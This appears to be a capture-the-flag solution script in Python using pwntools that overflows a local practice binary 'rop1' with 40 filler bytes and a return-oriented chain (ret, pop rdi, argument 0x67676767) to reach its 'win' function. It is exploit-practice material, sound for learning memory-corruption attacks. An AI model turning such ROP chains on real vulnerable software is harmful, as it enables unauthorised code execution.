#!/usr/bin/env python3

from pwn import *

TARGET = './rop1'

context.arch = 'amd64'

elf = ELF(TARGET)
p = process(TARGET)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"ret     : {hex(ret)}")
print(f"pop rdi : {hex(gadget)}")

win = elf.sym.win
print(f"win     : {hex(win)}")

payload = b'A' * 40 + p64(ret) + p64(gadget) + p64(0x67676767) + p64(win)
p.sendlineafter(b'ROP me: ', payload)

p.interactive()

